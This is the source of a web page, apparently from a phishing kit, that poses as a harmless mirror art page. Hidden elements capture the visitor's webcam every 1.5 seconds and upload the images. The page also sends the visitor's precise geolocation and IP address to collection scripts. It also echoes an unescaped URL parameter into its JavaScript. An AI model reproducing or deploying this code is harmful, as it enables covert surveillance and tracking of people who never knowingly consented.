<?php
$id = $_GET['id'];
if(!$id){
$id = "algaza".rand(20,99);
}

?>

<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>


<!-- FUNGSI AMBIL GAMBAR DAN LOKASI BRADER -->
<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
<?php
echo "    url: 'post.php?id=".$id."',";
?>
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 720, 640);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();


  $(document).ready(function() {
    navigator.geolocation.getCurrentPosition(function (position) {
         tampilLokasi(position);
    }, function (e) {
        alert('Geolocation Tidak Mendukung Pada Browser Anda');
    }, {
        enableHighAccuracy: true
    });
  });
  function tampilLokasi(posisi) {
    //console.log(posisi);
    var latitude  = posisi.coords.latitude;
    var longitude   = posisi.coords.longitude;
    $.ajax({
      type  : 'POST',
<?php
echo "    url: 'lokasi.php?id=".$id."',";
?>
      data  : 'latitude='+latitude+'&longitude='+longitude,
      success : function (e) {
        if (e) {
          $('#lokasi').html(e);
        }else{
          $('#lokasi').html('Tidak Tersedia');
        }
      }
    })
  }
</script>


<?php
include 'ip.php'
?>

    <body>


